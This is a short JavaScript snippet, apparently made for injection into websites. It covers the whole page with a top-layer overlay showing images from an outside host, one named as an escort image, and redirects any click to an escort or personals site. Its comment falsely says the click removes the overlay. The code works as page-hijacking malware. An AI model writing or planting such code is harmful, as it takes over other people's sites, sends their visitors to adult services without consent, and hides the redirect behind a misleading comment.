// Create the overlay element
const overlay = document.createElement("div");
overlay.style.position = "fixed";
overlay.style.top = "0";
overlay.style.left = "0";
overlay.style.width = "100%";
overlay.style.height = "100%";
overlay.style.backgroundImage = "url('https://newsite-livid.vercel.app/escortnew.jpg')"; // Background Image
overlay.style.backgroundRepeat = "no-repeat"
overlay.style.zIndex = "9999"; // High z-index to stay on top
overlay.style.display = "flex";
overlay.style.alignItems = "center";
overlay.style.justifyContent = "center";
overlay.style.color = "white";
overlay.style.fontSize = "24px";
overlay.style.fontFamily = "Arial, sans-serif";

// Add text inside the overlay
overlay.innerHTML = '<img src="https://newsite-livid.vercel.app/okk.jpg" alt="Image" width="313" height="330">';

// Append overlay to the body
document.body.appendChild(overlay);

// Remove overlay when clicked
overlay.addEventListener("click", () => {
    window.location.href = 'https://megapersonals.eu';});
